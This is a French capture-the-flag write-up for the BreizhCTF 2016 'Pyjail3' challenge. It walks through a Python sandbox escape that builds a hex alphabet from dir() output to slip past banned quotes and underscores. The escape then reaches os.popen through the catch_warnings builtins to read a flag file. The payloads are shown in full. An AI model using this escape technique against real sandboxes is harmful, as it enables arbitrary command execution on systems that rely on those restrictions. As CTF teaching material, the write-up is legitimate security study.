# BREIZHCTF 2K16
** Chall:** Pyjail3
**Points:** 300 |
**Taux de réussite:** 7% |


Dans ce challenge on reste dans la même logique que les deux précédents (sortir du jail), sauf que cette fois ci on a plus droit au caractères suivants : " ' __ 

On peut directement eliminé l'approche utilisée pour le pyjail2 car on a plus de moyen d'envoyer une chaine de caractères au programme. Reste l'approche du payjail1, mais celle ci necéssite des caractères non autorisés dans ce chall :/

Après beaucoup de M&Ms et de l'eau du robinet :p 
En listant les outils qu'on a :
 - fonction dir
 - fonction _
 - declaration de variable de type autre que str (a = 2)

L'idée de contruire une chaine de caractères qui sera notre payload pour récupérer le flag semble la plus pertinente, on sait que notre payload est le suivant :

"""
>wclass = ().__class__.__base__.__subclasses__()[59]()
>print wclass._module.__builtins__['__import__']('os').popen('cat flag').read()
 """

En utilisant la fonction dir on peut instancier un objet de type str :
```
> a= 2
> print dir(a)
['__abs__', '__add__', '__and__', '__class__', '__cmp__', '__coerce__', '__delattr__', '__div__', '__divmod__', '__doc__', '__float__', '__floordiv__', '__format__', '__getattribute__', '__getnewargs__', '__hash__', '__hex__', '__index__', '__init__', '__int__', '__invert__', '__long__', '__lshift__', '__mod__', '__mul__', '__neg__', '__new__', '__nonzero__', '__oct__', '__or__', '__pos__', '__pow__', '__radd__', '__rand__', '__rdiv__', '__rdivmod__', '__reduce__', '__reduce_ex__', '__repr__', '__rfloordiv__', '__rlshift__', '__rmod__', '__rmul__', '__ror__', '__rpow__', '__rrshift__', '__rshift__', '__rsub__', '__rtruediv__', '__rxor__', '__setattr__', '__sizeof__', '__str__', '__sub__', '__subclasshook__', '__truediv__', '__trunc__', '__xor__', 'bit_length', 'conjugate', 'denominator', 'imag', 'numerator', 'real']
> b = dir(a)[0]
> print b
'__abs__'
```
Comme notre payload contient plein de caractères non alphabétiques il sera dur pour nous de les retrouver juste avec ce qu'on a, mais si on encode le payload en base 16 (hex) l'alphabet sera réduit à 16 caractères !
En plus pour notre objet de type str on a les deux méthodes "encode" et "decode" qui sont autorisées \o/

```
>print b.encode
<built-in method encode of str object at 0x7f942313e780>
>print b.decode
<built-in method decode of str object at 0x7f942313e780>
```

Reste plus qu'a contruire l'alphabet hexadecimal, on récupère d'abord le mot hex pour qu'on puisse le passer aux deux méthodes "encode" et "decode".
```
> hex = dir(a)[16][2:5]
> print b.encode(hex)
5f5f6162735f5f
```

Une fois cette opération possible on passe à l'étape suivante qui consiste en la création de l'alphabet hex : 
```
>tmp = [c.encode(hex) for c in dir(b)]
>print tmp
['5f5f6164645f5f', '5f5f636c6173735f5f', '5f5f636f6e7461696e735f5f', '5f5f64656c617474725f5f', '5f5f646f635f5f', '5f5f65715f5f', '5f5f666f726d61745f5f', '5f5f67655f5f', '5f5f6765746174747269627574655f5f', '5f5f6765746974656d5f5f', '5f5f6765746e6577617267735f5f', '5f5f676574736c6963655f5f', '5f5f67745f5f', '5f5f686173685f5f', '5f5f696e69745f5f', '5f5f6c655f5f', '5f5f6c656e5f5f', '5f5f6c745f5f', '5f5f6d6f645f5f', '5f5f6d756c5f5f', '5f5f6e655f5f', '5f5f6e65775f5f', '5f5f7265647563655f5f', '5f5f7265647563655f65785f5f', '5f5f726570725f5f', '5f5f726d6f645f5f', '5f5f726d756c5f5f', '5f5f736574617474725f5f', '5f5f73697a656f665f5f', '5f5f7374725f5f', '5f5f737562636c617373686f6f6b5f5f', '5f666f726d61747465725f6669656c645f6e616d655f73706c6974', '5f666f726d61747465725f706172736572', '6361706974616c697a65', '63656e746572', '636f756e74', '6465636f6465', '656e636f6465', '656e647377697468', '657870616e6474616273', '66696e64', '666f726d6174', '696e646578', '6973616c6e756d', '6973616c706861', '69736469676974', '69736c6f776572', '69737370616365', '69737469746c65', '69737570706572', '6a6f696e', '6c6a757374', '6c6f776572', '6c7374726970', '706172746974696f6e', '7265706c616365', '7266696e64', '72696e646578', '726a757374', '72706172746974696f6e', '7273706c6974', '727374726970', '73706c6974', '73706c69746c696e6573', '73746172747377697468', '7374726970', '7377617063617365', '7469746c65', '7472616e736c617465', '7570706572', '7a66696c6c']


> alphabet = tmp[0][5]+tmp[3][-5]
>print alphabet
12
```

Et on continue jusqu'à ce que :
```
>print alphabet
1234567890abcdef
```

Une fois l'alphabet prêt on encode les deux instructions de notre payload en hexa : 
```
>>> "wclass = ().__class__.__base__.__subclasses__()[59]()".encode('hex')
'77636c617373203d2028292e5f5f636c6173735f5f2e5f5f626173655f5f2e5f5f737562636c61737365735f5f28295b35395d2829'
>>> "print wclass._module.__builtins__['__import__']('os').popen('cat flag').read()".encode('hex')
'7072696e742077636c6173732e5f6d6f64756c652e5f5f6275696c74696e735f5f5b275f5f696d706f72745f5f275d28276f7327292e706f70656e282763617420666c616727292e726561642829'
```

Sachant que les deux méthodes "encode" et "decode" retournent une chaine de caractères comme résultat, l'idée est d'envoyer ces deux lignes en hex au programme et que le programme les décode pour les envoyer à la fonction "_" qui prend en paramètre une chaine de caractères.
En utilisant le petit programme python 'generator.py' on transforme le code hexa en plusieurs accès à la liste alphabet qui contient l'alphabet hexadécimal (ce qui nous permet d'envoyer au programme que des caractères autorisés).

Initialisation de la variable wcalss : 
```
> _((alphabet[6]+alphabet[6]+alphabet[5]+alphabet[2]+alphabet[5]+alphabet[12]+alphabet[5]+alphabet[0]+alphabet[6]+alphabet[2]+alphabet[6]+alphabet[2]+alphabet[1]+alphabet[9]+alphabet[2]+alphabet[13]+alphabet[1]+alphabet[9]+alphabet[1]+alphabet[7]+alphabet[1]+alphabet[8]+alphabet[1]+alphabet[14]+alphabet[4]+alphabet[15]+alphabet[4]+alphabet[15]+alphabet[5]+alphabet[2]+alphabet[5]+alphabet[12]+alphabet[5]+alphabet[0]+alphabet[6]+alphabet[2]+alphabet[6]+alphabet[2]+alphabet[4]+alphabet[15]+alphabet[4]+alphabet[15]+alphabet[1]+alphabet[14]+alphabet[4]+alphabet[15]+alphabet[4]+alphabet[15]+alphabet[5]+alphabet[1]+alphabet[5]+alphabet[0]+alphabet[6]+alphabet[2]+alphabet[5]+alphabet[4]+alphabet[4]+alphabet[15]+alphabet[4]+alphabet[15]+alphabet[1]+alphabet[14]+alphabet[4]+alphabet[15]+alphabet[4]+alphabet[15]+alphabet[6]+alphabet[2]+alphabet[6]+alphabet[4]+alphabet[5]+alphabet[1]+alphabet[5]+alphabet[2]+alphabet[5]+alphabet[12]+alphabet[5]+alphabet[0]+alphabet[6]+alphabet[2]+alphabet[6]+alphabet[2]+alphabet[5]+alphabet[4]+alphabet[6]+alphabet[2]+alphabet[4]+alphabet[15]+alphabet[4]+alphabet[15]+alphabet[1]+alphabet[7]+alphabet[1]+alphabet[8]+alphabet[4]+alphabet[11]+alphabet[2]+alphabet[4]+alphabet[2]+alphabet[8]+alphabet[4]+alphabet[13]+alphabet[1]+alphabet[7]+alphabet[1]+alphabet[8]).decode(hex))	

>print wclass
catch_warnings()
```

Récupération du flag :
```
> _((alphabet[6]+alphabet[9]+alphabet[6]+alphabet[1]+alphabet[5]+alphabet[8]+alphabet[5]+alphabet[14]+alphabet[6]+alphabet[3]+alphabet[1]+alphabet[9]+alphabet[6]+alphabet[6]+alphabet[5]+alphabet[2]+alphabet[5]+alphabet[12]+alphabet[5]+alphabet[0]+alphabet[6]+alphabet[2]+alphabet[6]+alphabet[2]+alphabet[1]+alphabet[14]+alphabet[4]+alphabet[15]+alphabet[5]+alphabet[13]+alphabet[5]+alphabet[15]+alphabet[5]+alphabet[3]+alphabet[6]+alphabet[4]+alphabet[5]+alphabet[12]+alphabet[5]+alphabet[4]+alphabet[1]+alphabet[14]+alphabet[4]+alphabet[15]+alphabet[4]+alphabet[15]+alphabet[5]+alphabet[1]+alphabet[6]+alphabet[4]+alphabet[5]+alphabet[8]+alphabet[5]+alphabet[12]+alphabet[6]+alphabet[3]+alphabet[5]+alphabet[8]+alphabet[5]+alphabet[14]+alphabet[6]+alphabet[2]+alphabet[4]+alphabet[15]+alphabet[4]+alphabet[15]+alphabet[4]+alphabet[11]+alphabet[1]+alphabet[6]+alphabet[4]+alphabet[15]+alphabet[4]+alphabet[15]+alphabet[5]+alphabet[8]+alphabet[5]+alphabet[13]+alphabet[6]+alphabet[9]+alphabet[5]+alphabet[15]+alphabet[6]+alphabet[1]+alphabet[6]+alphabet[3]+alphabet[4]+alphabet[15]+alphabet[4]+alphabet[15]+alphabet[1]+alphabet[6]+alphabet[4]+alphabet[13]+alphabet[1]+alphabet[7]+alphabet[1]+alphabet[6]+alphabet[5]+alphabet[15]+alphabet[6]+alphabet[2]+alphabet[1]+alphabet[6]+alphabet[1]+alphabet[8]+alphabet[1]+alphabet[14]+alphabet[6]+alphabet[9]+alphabet[5]+alphabet[15]+alphabet[6]+alphabet[9]+alphabet[5]+alphabet[4]+alphabet[5]+alphabet[14]+alphabet[1]+alphabet[7]+alphabet[1]+alphabet[6]+alphabet[5]+alphabet[2]+alphabet[5]+alphabet[0]+alphabet[6]+alphabet[3]+alphabet[1]+alphabet[9]+alphabet[5]+alphabet[5]+alphabet[5]+alphabet[12]+alphabet[5]+alphabet[0]+alphabet[5]+alphabet[6]+alphabet[1]+alphabet[6]+alphabet[1]+alphabet[8]+alphabet[1]+alphabet[14]+alphabet[6]+alphabet[1]+alphabet[5]+alphabet[4]+alphabet[5]+alphabet[0]+alphabet[5]+alphabet[3]+alphabet[1]+alphabet[7]+alphabet[1]+alphabet[8]).decode(hex))

BZH{wow super flag \o/}
```


